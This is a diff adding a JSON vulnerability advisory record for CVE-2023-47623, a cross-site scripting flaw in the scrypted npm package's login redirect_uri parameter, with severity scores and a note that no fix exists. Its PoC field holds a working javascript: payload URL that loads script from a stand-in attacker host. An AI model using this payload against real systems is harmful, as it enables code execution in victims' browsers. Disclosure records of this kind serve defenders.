@@ -1,0 +1,65 @@
+{
+    "CVSSv3": {
+        "CVSS": "3.1",
+        "E": "P",
+        "attackVector": "NETWORK",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "NONE",
+        "userInteraction": "REQUIRED",
+        "scope": "CHANGED",
+        "confidentiality": "LOW",
+        "integrity": "LOW",
+        "availability": "NONE"
+    },
+    "credit": [
+        "Kevin Stubbings"
+    ],
+    "cvssDetails": [
+        {
+            "assigner": "NVD",
+            "cvssV3BaseScore": 6.1,
+            "cvssV3Vector": {
+                "CVSS": "3.1",
+                "attackVector": "NETWORK",
+                "attackComplexity": "LOW",
+                "privilegesRequired": "NONE",
+                "userInteraction": "REQUIRED",
+                "scope": "CHANGED",
+                "confidentiality": "LOW",
+                "integrity": "LOW",
+                "availability": "NONE"
+            },
+            "severity": "medium"
+        }
+    ],
+    "cvssScore": 6.1,
+    "disclosureTime": "2023-12-13 22:43:43",
+    "epssDetails": {
+        "modelVersion": "v2023.03.01",
+        "percentile": "0.06914",
+        "probability": "0.00043"
+    },
+    "exploitMaturity": "Proof of Concept",
+    "id": "SNYK-JS-SCRYPTED-6128852",
+    "identifiers": {
+        "CVE": [
+            "CVE-2023-47623"
+        ],
+        "CWE": [
+            "CWE-79"
+        ]
+    },
+    "language": "js",
+    "malicious": false,
+    "packageManager": "npm",
+    "publicationTime": "2023-12-15 12:45:17",
+    "remediation": "There is no fixed version for scrypted . ",
+    "severity": "medium",
+    "socialTrendAlert": false,
+    "title": "Cross-site Scripting",
+    "vulnDescription": {
+        "Overview": "Affected versions of this package are vulnerable to Cross-site Scripting in the login page via the redirect_uri parameter. An attacker can execute arbitrary JavaScript code on the victim's browser by specifying a URL with the JavaScript scheme ( javascript: ) after the login. This issue may lead to Remote Code Execution. ",
+        "PoC": " https://localhost:10443/endpoint/test/test?redirect_uri=javascript:var%20script%20=%20document.createElement('script');script.src%20=%20'https://attacker.domain';%20document.head.appendChild(script);#// "
+    },
+    "source_code": []
+}
